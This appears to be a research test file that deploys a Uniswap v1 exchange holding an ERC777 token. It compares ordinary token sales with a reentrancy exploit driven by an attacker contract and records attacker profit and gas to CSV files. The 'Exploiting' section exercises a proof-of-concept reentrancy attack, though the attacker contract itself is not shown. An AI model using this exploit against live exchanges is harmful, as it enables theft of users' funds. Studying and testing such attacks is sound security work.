const { BN, balance, singletons, ether } = require('openzeppelin-test-helpers');
const { expect } = require('chai');

const Factory = artifacts.require("uniswap_factory");
const Exchange = artifacts.require("uniswap_exchange");
const ERC777Token = artifacts.require("ERC777Token");
const AttackerContract = artifacts.require("Attacker");

const fastcsv = require('fast-csv');
const fs = require('fs');

function shouldSellTokensExploitingReentrancy(initialTokenBalance, numberOfSales, attacker) {
  it(`executes ${numberOfSales} reentrant token sales`, async function () {
    const attackerEthBalanceTracker = await balance.tracker(attacker);
    await attackerEthBalanceTracker.get();
    
    let tokenAmountToSellPerCall = Math.floor(initialTokenBalance / numberOfSales);

    const { receipt:receiptCallExchange } = await this.attackerContract.callExchange(
      tokenAmountToSellPerCall,
      numberOfSales,
      { from: attacker }
    );

    const { receipt:receiptWithdraw } = await this.attackerContract.withdraw({ from: attacker });

    const attackerProfit = await attackerEthBalanceTracker.delta();
    expect(attackerProfit).to.be.bignumber.gt('0');
    expect(
      await this.token.balanceOf(this.attackerContract.address)
    ).to.be.bignumber.eq(new BN(initialTokenBalance % numberOfSales));
    
    let result = {
      numberOfSales: numberOfSales,
      gasUsed: receiptCallExchange.gasUsed + receiptWithdraw.gasUsed,
      tokensSoldPerCall: tokenAmountToSellPerCall,
      attackerProfit: web3.utils.fromWei(attackerProfit, 'ether')
    }

    this.results.push(result);
  });
}

function shouldSellTokensInMultipleSales(initialTokenBalance, numberOfSales, attacker) {
  it(`executes ${numberOfSales} external token sales`, async function () {
    const attackerEthBalanceTracker = await balance.tracker(attacker);
    
    let tokenAmountToSellPerCall = Math.floor(initialTokenBalance / numberOfSales);
    let gasUsed = 0;

    for (let i = 1; i <= numberOfSales; i++) {
      const { receipt } = await this.exchange.tokenToEthSwapInput(
        tokenAmountToSellPerCall,
        1, // min_eth
        (await web3.eth.getBlock('latest')).timestamp * 2, // deadline
        { from: attacker }
      );
      gasUsed += receipt.gasUsed;
    }
    
    const attackerProfit = await attackerEthBalanceTracker.delta();

    expect(attackerProfit).to.be.bignumber.gt('0');
    expect(
      await this.token.balanceOf(attacker)
    ).to.be.bignumber.eq(new BN(initialTokenBalance % numberOfSales));

    let result = {
      numberOfSales: numberOfSales,
      gasUsed: gasUsed,
      tokensSoldPerCall: tokenAmountToSellPerCall,
      attackerProfit: web3.utils.fromWei(attackerProfit, 'ether')
    }

    this.results.push(result);
  });
}

contract("Uniswap", ([_, registryFunder, deployer, attacker]) => {
  const maxTokenSales = 35;
  const attackerInitialTokenBalance = new BN(7000);
  const exchangeInitalTokenReserve = new BN(5000);
  const exchangeInitialETHReserve = new BN(30);

  beforeEach(async function () {
    // Deploy ERC1820 registry and ERC777 token
    this.erc1820Registry = await singletons.ERC1820Registry(registryFunder);
    this.token = await ERC777Token.new({ from: deployer });

    // Deploy a exchange that will be used as the factory template
    this.exchangeTemplate = await Exchange.new({from: deployer});

    // Deploy factory, initializing it with the address of the first exchange that is be used as template
    this.factory = await Factory.new({ from: deployer });
    await this.factory.initializeFactory(this.exchangeTemplate.address, {from: deployer});

    // Create a new exchange for the ERC777 token, and retrieve the deployed exchange's address
    const { logs } = await this.factory.createExchange(this.token.address, { from: deployer });
    this.exchange = await Exchange.at(logs[0].args.exchange);

    // Add initial liquidity to the exchange, first approving the necessary tokens
    await this.token.approve(this.exchange.address, exchangeInitalTokenReserve, { from: deployer })
    const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
    await this.exchange.addLiquidity(
      0, // min_liquidity
      exchangeInitalTokenReserve,
      deadline,
      {
        from: deployer,
        value: web3.utils.toWei(exchangeInitialETHReserve)
      }
    );

    // Verify exchange's initial ETH balance
    expect(
      await balance.current(this.exchange.address)
    ).to.be.bignumber.equal(ether(exchangeInitialETHReserve));

    // Verify exchange's initial token balance
    expect(
      await this.token.balanceOf(this.exchange.address)
    ).to.be.bignumber.equal(exchangeInitalTokenReserve);
  });

  describe('== Legitimate trading ==', function () {
    beforeEach(async function () {
      // Give the attacker the initial token balance
      await this.token.transfer(attacker, attackerInitialTokenBalance, { from: deployer });
      // Attacker approves the exchange all token balance
      await this.token.approve(this.exchange.address, attackerInitialTokenBalance, { from: attacker });
    });

    describe('Single external token sale', function () {
      before(function () {
        this.results = [];
      });
  
      after(function () {
        fastcsv
          .write(this.results, { headers: true })
          .pipe(fs.createWriteStream('results/single-token-sale.csv'));
      });

      it('executes a single token sale', async function () {  
        const attackerEthBalanceTracker = await balance.tracker(attacker);
        await attackerEthBalanceTracker.get();
    
        const { receipt } = await this.exchange.tokenToEthSwapInput(
          attackerInitialTokenBalance, // tokens to be sold
          1, // min_eth
          (await web3.eth.getBlock('latest')).timestamp * 2, // deadline
          { from: attacker }
        );

        const attackerProfit = await attackerEthBalanceTracker.delta();

        expect(attackerProfit).to.be.bignumber.gt('0');
        expect(await this.token.balanceOf(attacker)).to.be.bignumber.eq('0');
        expect(
          await this.token.balanceOf(this.exchange.address)
        ).to.be.bignumber.eq(attackerInitialTokenBalance.add(exchangeInitalTokenReserve));
  
        let result = {
          numberOfSales: 1,
          gasUsed: receipt.gasUsed,
          tokensSoldPerCall: attackerInitialTokenBalance.toNumber(),
          attackerProfit: web3.utils.fromWei(attackerProfit, 'ether')
        }

        this.results.push(result);
      });
    });

    describe('Multiple external token sales', function () {
      before(function () {
        this.results = [];
      });
  
      after(function () {
        fastcsv
          .write(this.results, { headers: true })
          .pipe(fs.createWriteStream('results/multiple-external-token-sales.csv'));
      });

      for (let numberOfSales = 1; numberOfSales <= maxTokenSales; numberOfSales++) {
        shouldSellTokensInMultipleSales(attackerInitialTokenBalance, numberOfSales, attacker);
      }
    });
  });

  describe('== Exploiting ==', function () {
    before(function () {
      this.results = [];
    });

    after(function () {
      fastcsv
        .write(this.results, { headers: true })
        .pipe(fs.createWriteStream('results/reentrant-microtrading-sales.csv'));
    });

    beforeEach(async function () {
      // Setup the attacker contract and give it some tokens
      // The attacker contract approves tokens to the exchange in its constructor
      this.attackerContract = await AttackerContract.new(
        this.exchange.address,
        this.token.address,
        { from: attacker }
      );
      
      // Attacker contract has some initial balance of tokens
      await this.token.transfer(
        this.attackerContract.address,
        attackerInitialTokenBalance,
        { from: deployer }
      );

      expect(
        await this.token.balanceOf(this.attackerContract.address)
      ).to.be.bignumber.equal(attackerInitialTokenBalance);

      expect(
        await this.token.allowance(this.attackerContract.address, this.exchange.address)
      ).to.be.bignumber.equal(attackerInitialTokenBalance);

      expect(
        await balance.current(this.attackerContract.address)
      ).to.be.bignumber.equal(ether('0'));

      expect(
        await this.erc1820Registry.getInterfaceImplementer(
          this.attackerContract.address,
          web3.utils.sha3('ERC777TokensSender')
        )
      ).to.be.equal(this.attackerContract.address);
    });
    
    for (let numberOfSales = 1; numberOfSales <= maxTokenSales; numberOfSales++) {
      shouldSellTokensExploitingReentrancy(attackerInitialTokenBalance, numberOfSales, attacker);      
    }
  });
});